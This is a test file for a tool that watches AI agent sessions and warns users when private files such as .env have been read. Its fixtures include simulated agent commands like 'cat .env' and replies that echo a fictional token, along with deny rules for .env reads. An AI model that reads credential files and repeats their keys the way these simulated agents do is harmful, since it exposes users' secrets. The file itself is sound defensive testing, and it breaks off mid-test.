// Copyright 2026 Nessprim Karol Kozer
// SPDX-License-Identifier: Apache-2.0
import { test } from 'node:test';
import { strict as assert } from 'node:assert';
import { join } from 'node:path';
import { ClaudeCodeSessionDiscovery } from '../../../src/adapter/claude-code/discovery/claude-code-session-discovery.ts';
import { ClaudeCodeSessionSource } from '../../../src/adapter/claude-code/events/claude-code-session-source.ts';
import { hookEntries, withHookEntries } from '../../../src/adapter/claude-code/settings/hook-entries.ts';
import { Redactor } from '../../../src/core/redaction/redactor.ts';
import { NodeFileSystem } from '../../../src/infrastructure/node-file-system.ts';
import type { AlertStore, RememberedAlert } from '../../../src/ports/alert-store.ts';
import { NoticeWordsRenderer } from '../../../src/report/watch/render/notice-words.ts';
import { SubagentWatch, type WatchOptions } from '../../../src/report/watch/subagent-watch.ts';
import { ONWARD_SECRET, ONWARD_SESSION_ID, onwardSessionFiles } from '../../helpers/onward-session.ts';
import { RETURN_SESSION_ID, returnSessionFiles } from '../../helpers/return-session.ts';
import { jsonl, writeSession } from '../../helpers/synthetic-session.ts';

const files = new NodeFileSystem();

/** The store as the two hooks see it, without a disk. */
function memoryStore(): AlertStore & { readonly kept: Map<string, RememberedAlert[]> } {
  const kept = new Map<string, RememberedAlert[]>();
  return {
    kept,
    remember: async (sessionId, alert) => {
      const session = (kept.get(sessionId) ?? []).filter((remembered) => remembered.agentId !== alert.agentId);
      kept.set(sessionId, [...session, alert]);
    },
    take: async (sessionId) => {
      const session = kept.get(sessionId) ?? [];
      kept.delete(sessionId);
      return session;
    },
    peek: async (sessionId) => kept.get(sessionId) ?? [],
  };
}

/** Everything a watch needs but the store and the preferences file, which the tests around this choose. */
function parts(text: string): Omit<ConstructorParameters<typeof SubagentWatch>[0], 'store' | 'preferencesPath'> & { store: AlertStore } {
  return {
    source: new ClaudeCodeSessionSource({ discovery: new ClaudeCodeSessionDiscovery(files), files }),
    files,
    input: { readAll: async () => text },
    createRedactor: (projectRoot) => new Redactor('test', projectRoot, false),
    renderer: new NoticeWordsRenderer(),
    notifier: { notify: async () => true },
    home: '/Users/someone',
    store: memoryStore(),
    invocation: { find: async () => 'agentwhy', version: async () => undefined },
  };
}

function watchWith(text: string, store: AlertStore): SubagentWatch {
  return new SubagentWatch({
    source: new ClaudeCodeSessionSource({ discovery: new ClaudeCodeSessionDiscovery(files), files }),
    files,
    input: { readAll: async () => text },
    createRedactor: (projectRoot) => new Redactor('test', projectRoot, false),
    renderer: new NoticeWordsRenderer(),
    notifier: { notify: async () => true },
    home: '/Users/someone',
    preferencesPath: '/Users/someone/.config/agentwhy/notices.json',
    store,
    invocation: { find: async () => 'agentwhy', version: async () => undefined },
  });
}

/** A `Stop` input as B8b measured one: the session, the primary transcript, and the turn's last words. */
const turnEnded = (transcript: string, sessionId: string): string =>
  JSON.stringify({ hook_event_name: 'Stop', session_id: sessionId, transcript_path: transcript, cwd: '/work/the-app', last_assistant_message: 'Done.' });

async function transcriptOf(t: Parameters<typeof writeSession>[0], session: Record<string, string>, id: string): Promise<string> {
  return join(await writeSession(t, session), `${id}.jsonl`);
}

const said = (output: string): string => (output === '' ? '' : (JSON.parse(output) as { systemMessage: string }).systemMessage);

// `the-agent-nobody-watches` R2: the one agent with no SubagentStop of its own is asked about here.
test('at the end of the turn, the session\'s own agent is asked about too', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);

  const result = await watchWith(turnEnded(transcript, 's-own'), memoryStore()).run({ on: 'value', channels: ['chat'] });

  assert.match(said(result.output), /^agentwhy · I keep watch over your private files\. A key from one of them is now in this conversation — change it\. Details: agentwhy report --open$/);
  // R5 of the other spec, and this project's own rule: no path, no value, no identifier reaches a notice.
  for (const forbidden of [ONWARD_SECRET, '.env', 'apps/']) assert.ok(!result.output.includes(forbidden), forbidden);
});

// R6: `alertOf` reads the whole transcript, so without this the same line would arrive after every later turn.
test('the same reach is not said again in the next turn', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const store = memoryStore();
  const options: WatchOptions = { on: 'value', channels: ['chat'] };

  const first = await watchWith(turnEnded(transcript, 's-own'), store).run(options);
  const second = await watchWith(turnEnded(transcript, 's-own'), store).run(options);

  assert.match(said(first.output), /^agentwhy · I keep watch over your private files\. A key from one of them/);
  // The fact is not said twice; what the next quiet turn says is what the session holds, in the past tense (R6).
  assert.equal(said(second.output), 'agentwhy · Nothing new now. Earlier in this chat your AI read a key from a private file. Details: agentwhy report --open');
});

test('a delegated agent and the conversation itself are counted together, not listed', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const store = memoryStore();
  await store.remember('s-own', { agentId: 'a-1', level: 'value', words: 'Explore agent wrote a value from a protected file.' });

  const result = await watchWith(turnEnded(transcript, 's-own'), store).run({ on: 'value', channels: ['chat'] });

  assert.equal(said(result.output), 'agentwhy · ROTATE: 2 agents wrote a value from a protected file; their answers may carry it. Details: agentwhy report --open');
});

/**
 * Measured on a real session, and pinned on the fixture that has the same shape: the main agent searched, a value
 * from a protected file landed in what it wrote, the model recorded the use - and `wroteValue`/`wroteOnward`, which
 * describe what came back from a delegated agent, stayed unset. Read by those flags alone the level came out
 * `reached`, which says "no value found in its messages" about a conversation that has one in it.
 */
test('a value the conversation used itself is a value, not a path in a result', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('repeated'), ONWARD_SESSION_ID);

  const result = await watchWith(turnEnded(transcript, 's-used'), memoryStore()).run({ on: 'value', channels: ['chat'] });

  assert.match(said(result.output), /^agentwhy · I keep watch over your private files\. A key from one of them is now in this conversation — change it\. Details: agentwhy report --open$/);
});

// R7: `reached` is quiet unless it was asked for, on this event as on the other.
test('a conversation that reached files and wrote no value is quiet until asked', async (t) => {
  const transcript = await transcriptOf(t, returnSessionFiles({ carried: 'value', resultMissing: true }), RETURN_SESSION_ID);

  const quiet = await watchWith(turnEnded(transcript, 's-reached'), memoryStore()).run({ on: 'value', clean: 'off', channels: ['chat'] });
  const asked = await watchWith(turnEnded(transcript, 's-reached'), memoryStore()).run({ on: 'reached', clean: 'off', channels: ['chat'] });

  assert.equal(quiet.output, '');
  // No count where an agent below it reached something too: counting both would count one file twice.
  assert.match(said(asked.output), /^agentwhy · CHECK: This conversation reached protected files; no value found in its messages\./);
});

/*
 * `the-agent-tells-you` R2 and R3, which amend R7 of this specification: a refusal can be asked for, and is the one
 * notice that asks for nothing back. It stays under both other thresholds, where a rule holding is not news.
 */
test('a conversation whose only attempt a rule refused is said where refusals are asked for, and nowhere else', async (t) => {
  const call = { type: 'assistant', isSidechain: false, cwd: '/work/the-app', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_01REFUSEDAAAAAAAAAAAAAAA', name: 'Read', input: { file_path: 'apps/web/.env' } }] } };
  const denied = {
    type: 'user',
    isSidechain: false,
    cwd: '/work/the-app',
    message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_01REFUSEDAAAAAAAAAAAAAAA', content: 'Permission to read this file was denied.' }] },
    toolDenialKind: 'permission-rule',
  };
  const transcript = await transcriptOf(t, { 'refused-only.jsonl': jsonl(call, denied) }, 'refused-only');

  const quiet = await watchWith(turnEnded(transcript, 's-refused-value'), memoryStore()).run({ on: 'value', clean: 'off', channels: ['chat'] });
  const stillQuiet = await watchWith(turnEnded(transcript, 's-refused-reached'), memoryStore()).run({ on: 'reached', clean: 'off', channels: ['chat'] });
  const asked = await watchWith(turnEnded(transcript, 's-refused-asked'), memoryStore()).run({ on: 'refused', clean: 'off', channels: ['chat'] });

  assert.deepEqual([quiet.output, stillQuiet.output], ['', '']);
  assert.equal(said(asked.output), 'agentwhy · NOTE: a rule refused 1 attempt at protected files; nothing was reached. Details: agentwhy report --open');
  // The words name the rule and nothing else: no path, no agent, nothing to act on.
  for (const forbidden of ['.env', 'apps/', 'ROTATE', 'CHECK']) assert.ok(!asked.output.includes(forbidden), forbidden);
});

/**
 * Every way of failing to look is silence on this event: a notice at the end of every turn, for the rest of the
 * session, is worse than the silence it replaces, and `check` finds the same thing without a hook.
 */
test('a turn whose transcript cannot be read says nothing at all', async (t) => {
  const missing = join(await writeSession(t, {}), 'not-here.jsonl');

  const nothing = await watchWith(turnEnded(missing, 's-broken'), memoryStore()).run({ on: 'value', channels: ['chat'] });
  const noPath = await watchWith(JSON.stringify({ hook_event_name: 'Stop', session_id: 's-bare' }), memoryStore()).run({ on: 'value', channels: ['chat'] });

  assert.deepEqual([nothing.output, noPath.output], ['', '']);
});

// D14: exit 2 here would keep the turn from ending. The command never returns one, whatever it was handed.
test('nothing about a Stop input is ever a reason to exit 2', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);

  for (const text of [turnEnded(transcript, 's-own'), '{"hook_event_name":"Stop"}', 'not json']) {
    const result = await watchWith(text, memoryStore()).run({ on: 'value', channels: ['chat'] });
    assert.equal(typeof result.output, 'string', text.slice(0, 20));
  }
});

/*
 * `the-agent-tells-you` R4-R6. Silence cannot say whether a hook ran, so a quiet turn may say so - once by default,
 * after every reply where someone asks for that, never where they do not.
 */
test('a quiet turn says the session is watched once, and then keeps quiet', async (t) => {
  const transcript = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet');
  const store = memoryStore();
  const turn = turnEnded(transcript, 's-quiet');

  const first = await watchWith(turn, store).run({ on: 'value', channels: ['chat'] });
  const second = await watchWith(turn, store).run({ on: 'value', channels: ['chat'] });

  assert.equal(said(first.output), "agentwhy · ✓ So far your AI hasn't opened any private files. I'm keeping watch.");
  assert.equal(second.output, '', 'said once is once, however many quiet turns follow');
});

test('every-turn says each quiet turn, and off says none of them', async (t) => {
  const transcript = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet');
  const everyTurn = memoryStore();
  const turn = turnEnded(transcript, 's-every');

  const first = await watchWith(turn, everyTurn).run({ on: 'value', clean: 'every-turn', channels: ['chat'] });
  const second = await watchWith(turn, everyTurn).run({ on: 'value', clean: 'every-turn', channels: ['chat'] });
  const silent = await watchWith(turnEnded(transcript, 's-off'), memoryStore()).run({ on: 'value', clean: 'off', channels: ['chat'] });

  assert.equal(said(first.output), "agentwhy · ✓ Your AI didn't open any private files in this reply.");
  assert.equal(said(second.output), "agentwhy · ✓ Your AI didn't open any private files in this reply.");
  assert.equal(silent.output, '');
});

/*
 * The line that must never be written: a turn nobody could read is not a quiet turn. Every way of failing to look
 * stays silent here, as it did before there was anything to say about a quiet one.
 */
test('a turn that could not be read is never called quiet', async (t) => {
  const missing = join(await writeSession(t, {}), 'not-here.jsonl');

  const unreadable = await watchWith(turnEnded(missing, 's-unreadable'), memoryStore()).run({ on: 'value', clean: 'every-turn', channels: ['chat'] });
  const noPath = await watchWith(JSON.stringify({ hook_event_name: 'Stop', session_id: 's-bare' }), memoryStore()).run({ on: 'value', clean: 'every-turn', channels: ['chat'] });

  assert.deepEqual([unreadable.output, noPath.output], ['', '']);
});

// R6 again, from the other side: a session that reached a file and was told so is not "nothing reached" afterwards.
test('a quiet turn of a session that reached something says both, apart', async (t) => {
  const transcript = await transcriptOf(t, returnSessionFiles({ carried: 'value', resultMissing: true }), RETURN_SESSION_ID);
  const store = memoryStore();
  const turn = turnEnded(transcript, 's-history');

  const told = await watchWith(turn, store).run({ on: 'reached', clean: 'every-turn', channels: ['chat'] });
  const after = await watchWith(turn, store).run({ on: 'reached', clean: 'every-turn', channels: ['chat'] });

  assert.match(said(told.output), /^agentwhy · CHECK: This conversation reached protected files/);
  assert.equal(said(after.output), 'agentwhy · Nothing new now. Earlier in this chat your AI opened a private file. Details: agentwhy report --open');
});

/*
 * R6a: under the default threshold an opened file without a value is not said - and the clean line, which says no
 * private file was opened, is not said over it either. Found 2026-10-01: the defaults said it over exactly this.
 */
test('a turn that opened a private file nobody asked to hear about is never called clean', async (t) => {
  const transcript = await transcriptOf(t, returnSessionFiles({ carried: 'value', resultMissing: true }), RETURN_SESSION_ID);
  const store = memoryStore();

  const once = await watchWith(turnEnded(transcript, 's-unsaid'), store).run({ on: 'value', clean: 'once', channels: ['chat'] });
  const again = await watchWith(turnEnded(transcript, 's-unsaid'), store).run({ on: 'value', clean: 'once', channels: ['chat'] });
  const every = await watchWith(turnEnded(transcript, 's-unsaid-every'), memoryStore()).run({ on: 'value', clean: 'every-turn', channels: ['chat'] });

  assert.deepEqual([once.output, again.output, every.output], ['', '', '']);
  // A refusal opened nothing, so the clean line stays true over it.
  const call = { type: 'assistant', isSidechain: false, cwd: '/work/the-app', message: { role: 'assistant', content: [{ type: 'tool_use', id: 'toolu_01REFUSEDAAAAAAAAAAAAAAA', name: 'Read', input: { file_path: 'apps/web/.env' } }] } };
  const denied = {
    type: 'user',
    isSidechain: false,
    cwd: '/work/the-app',
    message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'toolu_01REFUSEDAAAAAAAAAAAAAAA', content: 'Permission to read this file was denied.' }] },
    toolDenialKind: 'permission-rule',
  };
  const refused = await transcriptOf(t, { 'refused-clean.jsonl': jsonl(call, denied) }, 'refused-clean');
  const overRefusal = await watchWith(turnEnded(refused, 's-refused-clean'), memoryStore()).run({ on: 'value', clean: 'once', channels: ['chat'] });
  assert.equal(said(overRefusal.output), "agentwhy · ✓ So far your AI hasn't opened any private files. I'm keeping watch.");
});

/** A watch whose system notifications are kept for the test to read. */
function watchTelling(text: string, store: AlertStore, notified: string[]): SubagentWatch {
  return new SubagentWatch({
    ...parts(text),
    notifier: { notify: async (title, words) => (notified.push(`${title}: ${words}`), true) },
    preferencesPath: '/Users/someone/.config/agentwhy/notices.json',
    store,
  });
}

/*
 * `when-an-agent-finishes` R15a: the Claude desktop app shows no line in the conversation (B4h), so where a system
 * notification was chosen the end of a turn goes there too - only what the turn adds, never a delegated agent's notice
 * a second time.
 */
test('the end of a turn is a system notification too, where one was chosen', async (t) => {
  const quiet = await transcriptOf(t, { 'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }) }, 'quiet');
  const clean = "✓ So far your AI hasn't opened any private files. I'm keeping watch.";

  const both: string[] = [];
  const told = await watchTelling(turnEnded(quiet, 's-both'), memoryStore(), both).run({ on: 'value', channels: ['chat', 'os'] });
  assert.equal(said(told.output), `agentwhy · ${clean}`);
  assert.deepEqual(both, [`agentwhy: ${clean}`]);

  const osOnly: string[] = [];
  const shown = await watchTelling(turnEnded(quiet, 's-os'), memoryStore(), osOnly).run({ on: 'value', channels: ['os'] });
  assert.deepEqual([shown.output, osOnly], ['', [`agentwhy: ${clean}`]]);

  const chatOnly: string[] = [];
  await watchTelling(turnEnded(quiet, 's-chat'), memoryStore(), chatOnly).run({ on: 'value', channels: ['chat'] });
  assert.deepEqual(chatOnly, []);

  const own = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const value: string[] = [];
  await watchTelling(turnEnded(own, 's-value'), memoryStore(), value).run({ on: 'value', channels: ['chat', 'os'] });
  assert.equal(value.length, 1);
  assert.match(value[0] ?? '', /^agentwhy: I keep watch over your private files\. A key from one of them is now in this conversation — change it\. Details: agentwhy report --open$/);
  assert.ok(!value.join('\n').includes(ONWARD_SECRET) && !value.join('\n').includes('.env'), 'no value and no path');

  // A delegated agent's notice went out when it finished: the end of the turn says it in the chat, not again here.
  const store = memoryStore();
  await store.remember('s-delegated', { agentId: 'a-1', level: 'value', words: 'Explore agent wrote a value from a protected file.' });
  const delegated: string[] = [];
  const turn = await watchTelling(turnEnded(quiet, 's-delegated'), store, delegated).run({ on: 'value', channels: ['chat', 'os'] });
  assert.match(said(turn.output), /Explore agent wrote a value/);
  assert.deepEqual(delegated, []);
});

/*
 * R22-R25: the choices live in a file agentwhy owns, not in the hook's command line, so a change to them reaches
 * the next turn without anyone editing a settings file. The order is the point: a flag that was written wins over
 * this project's answer, which wins over this person's, which wins over what this tool does by default.
 */
test("a person's choices answer where a flag does not, and this project answers over this person", async (t) => {
  const project = await writeSession(t, {
    'notices.json': JSON.stringify({ defaults: { clean: 'off' }, projects: { '/work/the-app': { clean: 'every-turn' } } }),
    'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }),
  });
  const turn = JSON.stringify({
    hook_event_name: 'Stop',
    session_id: 's-preferred',
    transcript_path: join(project, 'quiet.jsonl'),
    cwd: '/work/the-app',
  });
  const watching = (text: string): SubagentWatch => new SubagentWatch({ ...parts(text), preferencesPath: join(project, 'notices.json') });

  const chosen = await watching(turn).run({ channels: ['chat'] });
  const elsewhere = await watching(turn.replace('/work/the-app', '/work/other')).run({ channels: ['chat'] });
  const flagged = await watching(turn).run({ channels: ['chat'], clean: 'off' });

  assert.equal(said(chosen.output), "agentwhy · ✓ Your AI didn't open any private files in this reply.", "this project's answer");
  assert.equal(elsewhere.output, '', "another project falls back to this person's answer, which is off");
  assert.equal(flagged.output, '', 'a flag that was written wins over both');
});

// R24: a file nobody can read leaves the built-in answers standing, and the run still happens.
test('an unreadable preferences file is not a reason to stop watching', async (t) => {
  const project = await writeSession(t, {
    'notices.json': '{ this is not json',
    'quiet.jsonl': jsonl({ type: 'user', isSidechain: false, cwd: '/work/the-app', message: { role: 'user', content: 'hello' } }),
  });
  const turn = JSON.stringify({
    hook_event_name: 'Stop',
    session_id: 's-unreadable-preferences',
    transcript_path: join(project, 'quiet.jsonl'),
    cwd: '/work/the-app',
  });

  const store = memoryStore();
  const watching = (): SubagentWatch => new SubagentWatch({ ...parts(turn), store, preferencesPath: join(project, 'notices.json') });

  const first = await watching().run({ channels: ['chat'] });
  const second = await watching().run({ channels: ['chat'] });
  const third = await watching().run({ channels: ['chat'] });

  // Said once: without it, a broken file reads exactly like choices that were honoured.
  assert.equal(said(first.output), "agentwhy · Your notification choices could not be read, so agentwhy's own are in use. See: agentwhy notify");
  // Then the built-in answers carry on: `once` says the session is watched, and then keeps quiet.
  assert.equal(said(second.output), "agentwhy · ✓ So far your AI hasn't opened any private files. I'm keeping watch.");
  assert.equal(third.output, '');
});

/*
 * `the-agent-tells-you` R9-R14: the finding that only rotating a key undoes is said by the session's own agent, in a
 * message of its own - where every condition holds, and never where one of them does not.
 */
const blocked = (output: string): { decision?: string; reason?: string; systemMessage?: string } =>
  output === '' ? {} : (JSON.parse(output) as { decision?: string; reason?: string; systemMessage?: string });

function speakingWatch(text: string, entryPoint: string | undefined): SubagentWatch {
  return new SubagentWatch({
    ...parts(text),
    preferencesPath: '/Users/someone/.agentwhy/notices.json',
    ...(entryPoint === undefined ? {} : { entryPoint }),
  });
}

test('a value in the conversation is handed to the agent to say, with the line beside it', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);

  const result = await speakingWatch(turnEnded(transcript, 's-speaks'), 'cli').run({ channels: ['chat'] });
  const output = blocked(result.output);

  assert.equal(output.decision, 'block');
  // What 11 sessions of 11 relayed (§5) kept: agentwhy's finding, the file by name, and nothing but going back to it
  // forbidden. R12c: short, in plain words, opening with agentwhy's name - and none of the words a person does not use.
  assert.match(output.reason ?? '', /^agentwhy, the local tool this user runs, checked this turn: a key from the private file apps\/web\/\.env is now in this conversation\./);
  assert.match(output.reason ?? '', /at most three short sentences/);
  assert.match(output.reason ?? '', /starting with \*\*agentwhy\*\*/);
  assert.match(output.reason ?? '', /Do not open or read it again, do not repeat the key/);
  assert.match(output.reason ?? '', /running `agentwhy start --detach --session s-speaks --quiet` only if they say yes/);
  for (const word of ['credential', 'rotat', 'session records', 'protected']) assert.ok(!(output.reason ?? '').includes(word), word);
  // R11: the line is agentwhy's own record, in words the agent's message cannot soften.
  assert.match(output.systemMessage ?? '', /^agentwhy · I keep watch over your private files\. A key from one of them is now in this conversation — change it\. Details: agentwhy report --open$/);
  // R12: a path is allowed here, because the model already read the file. A value never is.
  assert.ok(!result.output.includes(ONWARD_SECRET), 'no value in anything the hook returns');
  assert.ok(!(output.reason ?? '').includes('file://'), 'no link (R21)');
});

/*
 * `the-chat-says-what-the-report-says` S6, `told`: a key from a file the person lets their AI read - tracked, not
 * blocked - is said as a read they allowed, never with "make a new key". Asked for by the maintainer on 2026-10-02.
 */
test('a key from a file the person lets the AI read is said as allowed, not as one to replace', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  // Tracked the way Settings tracks it: by the patterns, which the built-in list then gives up (F57, `withTold`). Both
  // built-in patterns that match `.env` are tracked, or the one left would still block it.
  const lists = await writeSession(t, { 'agentwhy.json': JSON.stringify({ version: 1, tell: ['**/.env*', '**/*.env'] }) });
  const watch = new SubagentWatch({
    ...parts(turnEnded(transcript, 's-told')),
    preferencesPath: '/Users/someone/.agentwhy/notices.json',
    entryPoint: 'claude-desktop',
    tell: { pathsFor: () => ({ shared: join(lists, 'agentwhy.json'), local: join(lists, 'none.json') }) },
  });

  const output = blocked((await watch.run({ channels: ['chat'] })).output);

  assert.equal(output.decision, 'block');
  assert.match(output.reason ?? '', /^agentwhy, the local tool this user runs, checked this turn: you read the private file apps\/web\/\.env, which this user lets you read/);
  assert.match(output.reason ?? '', /nothing needs to change/);
  assert.ok(!/new key|rotat|credential/.test(output.reason ?? ''), output.reason);
  assert.equal(output.systemMessage, 'agentwhy · I keep watch over your private files. Your AI read one you let it read. Nothing to do. Details: agentwhy report --open');
  assert.ok(!JSON.stringify(output).includes(ONWARD_SECRET), 'no value in anything the hook returns');
});

/*
 * Found by review: the read of a tracked file was counted as a key, so the quiet turn after it said "earlier your AI read
 * a key from a private file" - the alarm the told words had just taken back - and the agent was never asked for the
 * first quiet turn's words over it either.
 */
test('a later quiet turn says the earlier read was one the person allowed, never a key', async (t) => {
  const transcript = await transcriptOf(t, onwardSessionFiles('direct'), ONWARD_SESSION_ID);
  const lists = await writeSession(t, { 'agentwhy.json': JSON.stringify({ version: 1, tell: ['**/.env*', '**/*.env'] }) });
  const store = memoryStore();
  const watch = (): SubagentWatch => new SubagentWatch({
    ...parts(turnEnded(transcript, 's-told-later')),
    store,
    preferencesPath: '/Users/someone/.agentwhy/notices.json',
    entryPoint: 'claude-desktop',
    tell: { pathsFor: () => ({ shared: join(lists, 'agentwhy.json'), local: join(lists, 'none.json') }) },
  });

  await watch().run({ channels: ['chat'], clean: 'every-turn' });
  const after = blocked((await watch().run({ channels: ['chat'], clean: 'every-turn' })).output);

  assert.equal(after.decision, undefined, 'nothing asked of the agent');
  assert.equal(after.systemMessage, 'agentwhy · Nothing new now. Earlier in this chat your AI read a private file you let it read. ' +
    'Details: agentwhy report --open');
  assert.deepEqual(store.kept.get('s-told-later')?.find((record) => record.agentId === 'session:counts')?.counts, { values: 0, reached: 0, told: 1 });
});

/*
 * said-where-the-person-is SWB4, SWO1: measured in the desktop app - the agent ran `cd … && ls -la && cat .env`, wrote
 * the value back, and the line said "no value found". The value is the helper's, fictional.
 */
test('a key read beside a directory listing and written back is said as a key', async (t) => {
  const line = (type: 'assistant' | 'user', content: unknown): object => ({ type, isSidechain: false, cwd: '/work/the-app', message: { role: type, content } });
  const tool = 'toolu_01SWB4AAAAAAAAAAAAAAAAAA';
  const printed = ['total 8', '-rw-r--r--  1 someone  staff  42 Oct  2 10:00 .env', `API_TOKEN=${ONWARD_SECRET}`].join('\n');
  const transcript = await transcriptOf(t, {
    'swb4.jsonl': jsonl(
      line('user', 'What is in the env file?'),
      line('assistant', [{ type: 'tool_use', id: tool, name: 'Bash', input: { command: 'cd apps/web && ls -la && cat .env' } }]),
      line('user', [{ type: 'tool_result', tool_use_id: tool, content: printed }]),
      line('assistant', [{ type: 'text', text: `It holds API_TOKEN=${ONWARD_SECRET}.` }]),
    ),
  }, 'swb4');

  const result = await watchWith(turnEnded(transcript, 's-swb4'), memoryStore()).run({ channels: ['chat'] });

  assert.match(said(result.output), /^agentwhy · I keep watch over your private files\. A key from one of them/);
  assert.ok(!result.output.includes(ONWARD_SECRET), 'no value in anything the hook returns');
});

/** A conversation that printed private files with one shell line each and wrote back what it printed. Fictional values. */
async function printedBack(t: Parameters<typeof writeSession>[0], id: string, reads: readonly (readonly [command: string, printed: string])[]): Promise<string> {
  const line = (type: 'assistant' | 'user', content: unknown): object => ({ type, isSidechain: false, cwd: '/work/the-app', message: { role: type, content } });
  const calls = reads.flatMap(([command, printed], at) => {
    const tool = `toolu_01KIND${String(at)}`.padEnd(30, 'A');
    return [
      line('assistant', [{ type: 'tool_use', id: tool, name: 'Bash', input: { command } }]),
      line('user', [{ type: 'tool_result', tool_use_id: tool, content: printed }]),
    ];
  });
  const reply = reads.map(([, printed]) => printed).join(' and ');
  return transcriptOf(t, { [`${id}.jsonl`]: jsonl(line('user', 'What is in these files?'), ...calls, line('assistant', [{ type: 'text', text: `They hold ${reply}.` }])) }, id);
}

// One row of a customer list, in one word: a line of more than two words is ordinary text, and never traced (§5.2).
const CUSTOMERS = ['cat data/customers.csv', `4821,Lovelace,${ONWARD_SECRET}`] as const;
const EXAMPLE = ['cat .env.example', `API_KEY=${ONWARD_SECRET}`] as const;
const ENV = ['cat .env', `API_TOKEN=${ONWARD_SECRET}x`] as const;
/** The person's rules: a file of customers - private, and no key in it - beside the env files. */
const customersRule = async (t: Parameters<typeof writeSession>[0]): Promise<string> => join(await writeSession(t, {
  'settings.json': JSON.stringify({ permissions: { deny: ['Read(./data/customers.csv)', 'Read(**/.env*)'] } }),
}), 'settings.json');

/*
 * `the-chat-says-what-the-report-says` S1, S6, S8, S10: what a file held decides the words, as the report's to-do list
 * says it. Found by the maintainer on 2026-09-25 (§1): a customer list read into the chat was said as a credential to
 * rotate, and the agent then contradicted it. Data is said as data, and nothing in it asks for a new key.
 */
test('private data is said as data, never as a key, in the line and in what the agent is asked', async (t) => {
  const transcript = await printedBack(t, 'kind-data', [CUSTOMERS]);

  const output = blocked((await speakingWatch(turnEnded(transcript, 's-data'), 'claude-desktop').run({ channels: ['chat'], settingsPath: await customersRule(t) })).output);

  assert.equal(output.decision, 'block');
  assert.equal(output.systemMessage, 'agentwhy · I keep watch over your private files. Private data from one of them is now in this conversation — see what to do: agentwhy report --open');
  assert.match(output.reason ?? '', /private data from the private file data\/customers\.csv is now in this conversation/);
  assert.match(output.reason ?? '', /cannot be taken back/);
  for (const words of [output.reason ?? '', output.systemMessage ?? '']) {
    assert.ok(!/ROTATE|rotat|credential|new key|change the key|change it/i.test(words), words);
  }
  assert.ok(!JSON.stringify(output).includes(ONWARD_SECRET), 'nothing from the file in what the hook returns');
});

// S6, `template`: a value from a template may be a placeholder, so it is checked, not changed.
test('a value from a template file is asked to be checked', async (t) => {
  const transcript = await printedBack(t, 'kind-template', [EXAMPLE]);

  const output = blocked((await speakingWatch(turnEnded(transcript, 's-template'), 'claude-desktop').run({ channels: ['chat'] })).output);

  assert.equal(output.systemMessage, 'agentwhy · I keep watch over your private files. A key from one of them is now in this conversation — check it. Details: agentwhy report --open');
  assert.match(output.reason ?? '', /a value from the private file \.env\.example, named as a template/);
  assert.match(output.reason ?? '', /looks like a real key or a placeholder/);
});

// S1: several kinds in one turn are said as the strongest, naming only its files; the others are the report's.
test('keys beside data and a template are said as keys, naming the file of keys alone', async (t) => {
  const transcript = await printedBack(t, 'kind-strongest', [CUSTOMERS, EXAMPLE, ENV]);

  const output = blocked((await speakingWatch(turnEnded(transcript, 's-strongest'), 'claude-desktop').run({ channels: ['chat'], settingsPath: await customersRule(t) })).output);

  assert.match(output.systemMessage ?? '', /A key from one of them is now in this conversation — change it\./);
  assert.match(output.reason ?? '', /a key from the private file \.env is now in this conversation/);
  assert.ok(!(output.reason ?? '').includes('customers.csv') && !(output.reason ?? '').includes('.env.example'), output.reason);
});

// S1 with SW15: a later quiet turn says the earlier read was data, never a key.
test('a later quiet turn says the earlier read was private data', async (t) => {
  const transcript = await printedBack(t, 'kind-later', [CUSTOMERS]);
  const settingsPath = await customersRule(t);
  const store = memoryStore();

  await watchWith(turnEnded(transcript, 's-data-later'), store).run({ channels: ['chat'], clean: 'every-turn', settingsPath });
  const after = await watchWith(turnEnded(transcript, 's-data-later'), store).run({ channels: ['chat'], clean: 'every-turn', settingsPath });

  assert.equal(said(after.output), 'agentwhy · Nothing new now. Earlier in this chat your AI read private data from a private file. Details: agentwhy report --open');
});

/*
 * SW17, the maintainer's Codex session of 2026-10-02: `cat demo.env` printed the key, the reply repeated it, and the
 * line said nothing was opened - the bare name met no wildcard rule. The clean line over a key is the one sentence
 * this tool must never write, so this case runs end to end.
 */
test('a key read by a bare file name is said as a key, never as a clean turn', async (t) => {
  const transcript = await printedBack(t, 'bare-name', [['cat demo.env', `API_TOKEN=${ONWARD_SECRET}`]]);

  const output = blocked((await speakingWatch(turnEnded(transcript, 's-bare'), 'claude-desktop').run({ channels: ['chat'] })).output);

  assert.equal(output.decision, 'block');
  assert.match(output.reason ?? '', /a key from the private file demo\.env is now in this conversation/);
  assert.match(output.systemMessage ?? '', /A key from one of them is now in this conversation — change it\./);
});

/*
 * S1 of `the-chat-says-what-the-report-says`, built 2026-10-02 after the maintainer's test: a read of a tracked file
 * is told at every threshold, traced value or none. First built only for a value: a tracked read whose value was not
 * traced fell to `reached`, which the default threshold never says - the person heard an English "no value found"
 * over a read they had asked to hear about, and in the ChatGPT/Codex app nothing at all.
 */
test('a tracked file read without a traced value is still said as allowed', async (t) => {
  const lists = await writeSession(t, { 'agentwhy.json': JSON.stringify({ version: 1, tell: ['**/notes.txt'] }) });
